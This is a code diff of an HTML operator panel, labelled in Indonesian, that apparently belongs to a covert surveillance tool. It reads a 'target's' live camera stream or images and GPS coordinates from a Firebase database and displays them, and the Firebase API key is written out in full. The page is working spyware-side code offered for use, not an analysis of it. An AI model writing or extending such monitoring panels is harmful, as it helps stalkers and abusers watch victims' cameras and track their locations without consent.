@@ -1,76 +1,34 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Center</title>
+    <title>Monitor Panel</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .container { display: flex; gap: 20px; }
-        video { width: 640px; border: 2px solid #0f0; background: #111; }
-        .log { background: #111; padding: 15px; flex-grow: 1; border: 1px solid #0f0; }
-        button { background: #0f0; color: #000; border: none; padding: 10px; cursor: pointer; font-weight: bold; }
-    </style>
 </head>
-<body>
-    <h1>SYSTEM MONITORING : ACTIVE</h1>
-    <div class="container">
-        <video id="remoteVideo" autoplay playsinline></video>
-        <div class="log">
-            <h3>TARGET INFO</h3>
-            <p id="loc">Lokasi: Menunggu...</p>
-            <p id="stat">Status: Menghubungkan...</p>
-            <button onclick="location.reload()">RECONNECT SYSTEM</button>
-        </div>
-    </div>
+<body style="background:#000; color:#0f0; text-align:center; font-family:monospace;">
+    <h1>LIVE MONITOR</h1>
+    <img id="liveImg" style="border:2px solid #0f0; width:80%;">
+    <div id="info" style="margin-top:20px;"></div>
 
     <script>
-        const firebaseConfig = {
+        const config = {
             apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
-            authDomain: "chatroom-e9b3f.firebaseapp.com",
             databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "chatroom-e9b3f",
-            storageBucket: "chatroom-e9b3f.firebasestorage.app",
-            messagingSenderId: "125686404483",
-            appId: "1:125686404483:web:46e49688dfbd1b69d2d2b6"
+            projectId: "chatroom-e9b3f"
         };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database().ref('p2p_stream');
+        firebase.initializeApp(config);
+        const db = firebase.database().ref('simple_monitor');
 
-        let pc = new RTCPeerConnection({
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        // Pantau Gambar
+        db.child('img').on('value', s => {
+            if(s.val()) document.getElementById('liveImg').src = s.val();
         });
 
-        pc.ontrack = (event) => {
-            document.getElementById('remoteVideo').srcObject = event.streams[0];
-            document.getElementById('stat').innerText = "Status: STREAMING LIVE";
-        };
-
-        db.child('signal/offer').on('value', async (snapshot) => {
-            const offer = snapshot.val();
-            if (offer && !pc.currentRemoteDescription) {
-                await pc.setRemoteDescription(new RTCSessionDescription(offer));
-                const answer = await pc.createAnswer();
-                await pc.setLocalDescription(answer);
-                db.child('signal/answer').set({ type: answer.type, sdp: answer.sdp });
-            }
-        });
-
-        pc.onicecandidate = (event) => {
-            if (event.candidate) {
-                db.child('signal/monitorCandidates').push(event.candidate.toJSON());
-            }
-        };
-
-        db.child('signal/targetCandidates').on('child_added', (snapshot) => {
-            pc.addIceCandidate(new RTCIceCandidate(snapshot.val()));
-        });
-
-        db.child('status/location').on('value', s => {
+        // Pantau Lokasi
+        db.child('loc').on('value', s => {
             const d = s.val();
-            if(d) document.getElementById('loc').innerHTML = `Lokasi: <a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank" style="color:#0f0">KLIK MAPS</a>`;
+            if(d) document.getElementById('info').innerHTML = 
+                `LOKASI: <a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank" style="color:#0f0">KLIK LIHAT MAPS</a>`;
         });
     </script>
 </body>
